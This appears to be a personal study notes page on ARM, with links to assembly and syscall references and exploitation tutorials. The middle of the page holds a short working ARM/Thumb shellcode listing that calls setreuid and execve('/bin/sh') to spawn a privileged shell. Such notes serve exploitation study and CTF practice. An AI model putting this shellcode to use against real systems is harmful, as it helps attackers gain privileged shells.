---
title: ARM
---

## Architecture

### Assembly

- [Introduction to ARM Assembly Basics](https://azeria-labs.com/writing-arm-assembly-part-1/)
- [ARM Instruction Set Quick Reference Card](https://pages.cs.wisc.edu/~markhill/restricted/arm_isa_quick_reference.pdf)
- [Whirlwind Tour of ARM Assembly](https://www.coranac.com/tonc/text/asm.htm)

### Syscalls

- [Linux System Calls quick an easy](https://syscall.sh/)
- [Linux kernel syscall tables](https://syscalls.mebeim.net/)

## Shellcode

### `setreuid() + /bin/sh`

```asm {linenos=table}
.section .text
.global _start

_start:
    .code 32
    # Switch to Thumb mode
    add r3, pc, #1
    bx r3

    .code 16
    # r0 = geteuid()
    mov r7, #201
    svc #1

    # setreuid(geteuid(), geteuid())
    mov r1, r0
    mov r7, #203
    svc #1

    # execve("/bin/sh", 0, 0)
    adr     r0, binsh
    sub     r1, r1
    sub r2, r2
    strb    r2, [r0, #7]  // change binsh[7] to \0
    mov r7, #11
    svc #1

    # padding to align binsh
    mov r1, r7

binsh:
.ascii "/bin/shX"
```

## Resources

- [Azeria Labs Tutorials](https://azeria-labs.com)
- [Medium - Mohamad Aerabi: ARM Binary Analysis Series](https://medium.com/@mohamad.aerabi)
- [GitHub - arm_now](https://github.com/nongiach/arm_now)
- [A Noob's Guide To ARM Exploitation](https://ad2001.gitbook.io/a-noobs-guide-to-arm-exploitation)
- [ROP chains in ARM64](https://infosecwriteups.com/rop-chains-on-arm64-6ff10368798f)
